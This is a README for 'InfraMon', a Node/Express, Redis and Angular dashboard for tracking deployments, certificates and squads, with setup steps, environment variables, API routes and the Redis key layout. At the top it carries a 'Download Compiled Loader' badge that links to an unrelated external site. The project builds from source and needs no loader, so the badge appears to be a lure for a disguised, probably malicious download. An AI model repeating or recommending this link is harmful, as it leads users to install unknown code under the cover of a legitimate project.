# InfraMon

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Infrastructure monitoring dashboard for tracking application deployments, compliance, certificates, and squads across a multi-platform estate.

## Architecture

```
InfraMon/
├── backend/    Express + ioredis microservice (REST API + Redis storage)
└── frontend/   Angular 21 SPA (standalone components, signals)
```

- **Backend** stores data in Redis and serves a REST API. On startup it seeds reference data from YAML config files.
- **Frontend** is a single-page app that calls the backend API and displays tables, filters, and an alerts dashboard.

---

## Quick start

### Prerequisites

- Node.js ≥ 20
- A Redis instance reachable at `localhost:6379` (or set `REDISHOST` / `REDISPORT`)

### Backend

```bash
cd backend
cp config/sample_env config/.env   # edit INGEST_API_KEY and REDISHOST/REDISPORT
npm install
npm run dev                        # nodemon — auto-reloads on change
```

The server starts on **port 3000** by default (`PORT` env var to change).

### Frontend

```bash
cd frontend
npm install
npm start                          # ng serve — proxies /api → localhost:3000
```

The dev server starts on **http://localhost:4200**.

---

## Environment variables (backend)

| Variable           | Default                                   | Description                                      |
|--------------------|-------------------------------------------|--------------------------------------------------|
| `INGEST_API_KEY`   | `dev-default-ingest-key-change-me-xxxxxxxx` | API key required for all `POST` ingest calls   |
| `PORT`             | `3000`                                    | HTTP listen port                                 |
| `REDISHOST`        | `localhost`                               | Redis host (matches GCP Memorystore env)         |
| `REDISPORT`        | `6379`                                    | Redis port                                       |
| `REDIS_REJECT_UNAUTHORIZED` | —                                | Presence enables TLS. Value `false` / `0` / `no` skips cert/hostname verification; anything else verifies. |
| `REDISCERT`        | —                                         | CA certificate for TLS verification against a non-public CA. Accepts a PEM file path, inline PEM content, or base64-encoded PEM (auto-detected). Setting this also enables TLS. |
| `TIME_TO_LIVE_IN_SECONDS` | `36000` (10 h)                       | EXPIRE applied on every `set` / `sadd` / `rpush`. Set to `0` to disable TTLs (keys persist forever). |
| `REDIS_KEY_PREFIX` | `inframon:`                               | Prefix for all Redis keys                        |
| `NODE_ENV`         | `development`                             | Set to `production` to enforce real Redis and disable CORS |
| `LOG_LEVEL`        | `info`                                    | Pino log level: `error` \| `warn` \| `info` \| `debug` \| `silent` |

---

## Tests

```bash
cd backend && npm test    # Jest — 116 tests across 11 suites
```

---

## Seed data

On every startup the backend seeds Redis from `backend/config/*.yaml`:

| File                 | Resource       | Key field      |
|----------------------|----------------|----------------|
| `appinfo.yaml`       | Applications   | `appId`        |
| `appstatus.yaml`     | Deploy snapshots | `appId` + `deploymentPlatform` + `environment` |
| `certificates.yaml`  | TLS certs      | `certId`       |
| `infra.yaml`         | Infra platforms | `platformId`  |
| `squads.yaml`        | Squads         | `key`          |
| `tribes.yaml`        | Tribes         | `name`         |
| `subdomains.yaml`    | Sub-domains    | `name`         |
| `tribedomains.yaml`  | Tribe domains  | `name`         |

Seed data is upserted (never deleted), so existing runtime data (e.g. live ingest) is preserved between restarts. For `appstatus`, the YAML seed only writes cells that don't already have data.

---

## API overview

See [`backend/API.md`](backend/API.md) for the full endpoint reference.

| Route            | Methods       | Description                              |
|------------------|---------------|------------------------------------------|
| `/health`        | GET           | Liveness check                           |
| `/summary`       | GET           | Aggregated counts for the dashboard      |
| `/alerts`        | GET           | Computed actionable problems             |
| `/appinfo`       | GET, POST      | Application catalogue                    |
| `/appstatus`     | GET, POST      | Deployment + compliance snapshots        |
| `/certificates`  | GET, POST      | TLS certificate inventory                |
| `/infra`         | GET, POST      | Infrastructure platforms                 |
| `/squads`        | GET, POST      | Squad registry                           |
| `/tribes`        | GET, POST      | Tribe registry                           |
| `/subdomains`    | GET, POST      | Sub-domain registry                      |
| `/tribedomains`  | GET, POST      | Tribe-domain registry                    |

---

## Redis key layout

All keys are prefixed with `inframon:` (configurable via `REDIS_KEY_PREFIX`).

```
inframon:appinfo:<appId>                 → JSON AppInfo record
inframon:appinfos                        → SET of appIds

inframon:appstatus:<appId>:<plat>:<env>  → JSON DeploymentSnapshot
inframon:appstatus:idx:<appId>           → SET of "platform:env" cells for this app
inframon:appstatus:apps                  → SET of appIds with any snapshot

inframon:cert:<certId>                   → JSON Certificate record
inframon:certs                           → SET of certIds

inframon:infra:<platformId>              → JSON Infra record
inframon:infras                          → SET of platformIds

inframon:squad:<key>                     → JSON Squad record
inframon:squads                          → SET of squad keys

inframon:tribe:<name>                    → JSON Tribe record
inframon:tribes                          → SET of tribe names

inframon:subdomain:<name>                → JSON SubDomain record
inframon:subdomains                      → SET of subdomain names

inframon:tribedomain:<name>              → JSON TribeDomain record
inframon:tribedomains                    → SET of tribedomain names
```
